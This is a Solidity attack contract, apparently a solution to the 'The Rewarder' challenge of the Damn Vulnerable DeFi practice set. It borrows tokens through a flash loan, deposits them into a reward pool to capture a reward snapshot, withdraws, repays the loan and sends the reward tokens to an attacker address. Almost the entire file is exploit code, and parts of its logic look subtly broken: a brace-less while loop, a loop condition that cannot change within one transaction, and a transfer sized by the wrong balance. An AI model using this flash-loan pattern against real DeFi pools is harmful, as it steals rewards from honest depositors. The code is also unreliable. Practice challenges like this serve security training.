// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import {TheRewarderPool} from "../the-rewarder/TheRewarderPool.sol";
// import "./AccountingToken.sol";

/**
 * @title AttackRewarder
 * @author sidarth16
 */

interface IFlashLoanerPool{
    function flashLoan(uint256 amount) external;
}

// abstract contract MyRewarderPool{
//     uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;
//     uint256 public lastRecordedSnapshotTimestamp;
//     function deposit(uint256 amountToDeposit)virtual  external;
//     function withdraw(uint256 amountToWithdraw) virtual external;
//     function isNewRewardsRound() virtual external view returns (bool);
//     function distributeRewards() virtual external returns (uint256);
// }

contract AttackRewarder {

    using Address for address;

    TheRewarderPool public rewarderPool;
    IERC20 rewardToken ;
    IERC20 liquidityToken ;
    address flashLoanPool ;
    address rewarderPoolAdd;
    uint256 targetSnapshotTimeStamp;

     // Minimum duration of each round of rewards in seconds
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

    constructor (
        address _rewardPool, 
        address _flashLoanPool,
        address _liquidityTokenAddress
    ) {
        rewarderPool = TheRewarderPool(_rewardPool);
        flashLoanPool = _flashLoanPool;
        liquidityToken = IERC20(_liquidityTokenAddress);
        rewardToken = IERC20(rewarderPool.rewardToken());

        rewarderPoolAdd = _rewardPool;
    }

    function attack(uint256 amt, address attacker) external
    {   
        liquidityToken.approve(rewarderPoolAdd, amt);
        targetSnapshotTimeStamp = rewarderPool.lastRecordedSnapshotTimestamp();

        require( 
            (rewarderPool.lastRecordedSnapshotTimestamp() + REWARDS_ROUND_MIN_DURATION) - block.timestamp  > 2 ,
            "Attack called too late"
        );
        require( 
            (rewarderPool.lastRecordedSnapshotTimestamp() + REWARDS_ROUND_MIN_DURATION) - block.timestamp  < 20 ,
            "Attack called too early"
        );
        
        IFlashLoanerPool(flashLoanPool).flashLoan(amt);
        liquidityToken.transfer(flashLoanPool, amt);

        uint256 rewards_balance = rewardToken.balanceOf(attacker);
        rewardToken.transfer(attacker , rewards_balance );
    }

    function receiveFlashLoan(uint256 amt) external {
        require(rewarderPool.lastRecordedSnapshotTimestamp() == targetSnapshotTimeStamp ) ;
        rewarderPool.deposit(amt-20);
        uint256 extraTokensSpent = 0 ;
        while(rewarderPool.lastRecordedSnapshotTimestamp() == targetSnapshotTimeStamp)
            rewarderPool.deposit(1);
            extraTokensSpent+=1;

        rewarderPool.withdraw(amt-20 + extraTokensSpent);     

    }

}
